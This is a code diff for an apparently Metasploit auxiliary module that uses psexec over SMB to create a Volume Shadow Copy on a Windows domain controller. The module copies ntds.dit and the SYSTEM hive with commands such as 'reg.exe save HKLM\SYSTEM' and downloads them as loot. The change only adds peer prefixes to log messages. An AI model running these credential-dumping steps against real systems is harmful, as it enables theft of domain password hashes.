@@ -72,7 +72,7 @@ class Metasploit3 < Msf::Auxiliary
 			begin
 				smb_login
 			rescue StandardError => autherror
-				print_error("Unable to authenticate with given credentials: #{autherror}")
+				print_error("#{peer} - Unable to authenticate with given credentials: #{autherror}")
 				return
 			end
 			# If a VSC was specified then don't try and create one
@@ -131,16 +131,16 @@ class Metasploit3 < Msf::Auxiliary
 		begin
 			#Try to create the shadow copy
 			command = "%COMSPEC% /C echo #{createvsc} ^> #{text} > #{bat} & %COMSPEC% /C start cmd.exe /C #{bat}"
-			print_status("Creating Volume Shadow Copy")
+			print_status("#{peer} - Creating Volume Shadow Copy")
 			out = psexec(command)
 			#Get path to Volume Shadow Copy
 			vscpath = get_vscpath(text)
 		rescue StandardError => vscerror
-			print_error("Unable to create the Volume Shadow Copy: #{vscerror}")
+			print_error("#{peer} - Unable to create the Volume Shadow Copy: #{vscerror}")
 			return nil
 		end
 		if vscpath
-			print_good("Volume Shadow Copy created on #{vscpath}")
+			print_good("#{peer} - Volume Shadow Copy created on #{vscpath}")
 			return vscpath
 		else
 			return nil
@@ -159,7 +159,7 @@ class Metasploit3 < Msf::Auxiliary
 			end
 			return true
 		rescue StandardError => ntdscopyerror
-			print_error("Unable to copy ntds.dit from Volume Shadow Copy.Make sure target is a Windows Domain Controller: #{ntdscopyerror}")
+			print_error("#{peer} - Unable to copy ntds.dit from Volume Shadow Copy.Make sure target is a Windows Domain Controller: #{ntdscopyerror}")
 			return false
 		end
 	end
@@ -185,7 +185,7 @@ class Metasploit3 < Msf::Auxiliary
 			command = "%COMSPEC% /C reg.exe save HKLM\\SYSTEM %WINDIR%\\Temp\\sys /y"
 			return psexec(command)
 		rescue StandardError => hiveerror
-			print_error("Unable to copy the SYSTEM hive file: #{hiveerror}")
+			print_error("#{peer} - Unable to copy the SYSTEM hive file: #{hiveerror}")
 			return false
 		end
 	end
@@ -193,7 +193,7 @@ class Metasploit3 < Msf::Auxiliary
 
 	# Download the ntds.dit copy to your attacking machine
 	def download_ntds(file, ip)
-		print_status("Downloading ntds.dit file")
+		print_status("#{peer} - Downloading ntds.dit file")
 		begin
 			# Try to download ntds.dit
 			simple.connect("\\\\#{@ip}\\#{@smbshare}")
@@ -202,7 +202,7 @@ class Metasploit3 < Msf::Auxiliary
 			store_loot("NTDS.database", "data", ip, data, "ntds.dit", nil, nil)
 			remotefile.close
 		rescue StandardError => ntdsdownloaderror
-			print_error("Unable to downlaod ntds.dit: #{ntdsdownloaderror}")
+			print_error("#{peer} - Unable to downlaod ntds.dit: #{ntdsdownloaderror}")
 			return ntdsdownloaderror
 		end
 		simple.disconnect("\\\\#{@ip}\\#{@smbshare}")
@@ -211,7 +211,7 @@ class Metasploit3 < Msf::Auxiliary
 
 	# Download the SYSTEM hive copy to your attacking machine
 	def download_sys_hive(file, ip)
-		print_status("Downloading SYSTEM hive file")
+		print_status("#{peer} - Downloading SYSTEM hive file")
 		begin
 			# Try to download SYSTEM hive
 			simple.connect("\\\\#{@ip}\\#{@smbshare}")
@@ -220,7 +220,7 @@ class Metasploit3 < Msf::Auxiliary
 			store_loot("Registry.hive.system", "binary/reg", ip, data, "system-hive", nil, nil)
 			remotefile.close
 		rescue StandardError => sysdownloaderror
-			print_error("Unable to download SYSTEM hive: #{sysdownloaderror}")
+			print_error("#{peer} - Unable to download SYSTEM hive: #{sysdownloaderror}")
 			return sysdownloaderror
 		end
 		simple.disconnect("\\\\#{@ip}\\#{@smbshare}")
@@ -238,7 +238,7 @@ class Metasploit3 < Msf::Auxiliary
 			end
 			return prepath + vsc.split("ShadowCopy")[1].chomp
 		rescue StandardError => vscpath_error
-			print_error("Could not determine the exact path to the VSC check your WINPATH")
+			print_error("#{peer} - Could not determine the exact path to the VSC check your WINPATH")
 			return nil
 		end
 	end
